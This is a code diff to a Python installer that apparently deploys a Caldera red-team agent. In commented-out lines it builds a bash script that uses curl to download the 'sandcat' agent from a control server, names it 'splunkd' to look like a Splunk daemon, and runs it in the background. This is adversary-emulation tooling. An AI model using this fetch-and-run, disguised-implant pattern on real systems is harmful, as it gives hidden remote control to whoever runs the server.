@@ -5,7 +5,20 @@ from os.path import exists
 import stat
 
 def install(target_ip, server_ip, ssh_key, ansible_dir = 'ansible/caldera'):
+    """
+    # Initialize inventory
+    with open(f"{ansible_dir}/inventory", 'w') as inv_o:
+        inv_o.write(f"[nodes]\n{target_ip}")
+    
+    # Initialize installation script
+    cmd = f"#!/bin/bash\nserver='http://{server_ip}:8888';curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -group red -v &"
 
+    with open('install.sh', 'w') as install_o:
+        install_o.write(cmd)
+
+    #Mark script as executable
+    chmod(installer_path, stat.S_IEXEC | stat.S_IREAD | stat.S_IWRITE)
+    """
     # Confirm if installer script is present
     if not exists('install.sh'):
         print("Installer script not present! Exiting...")
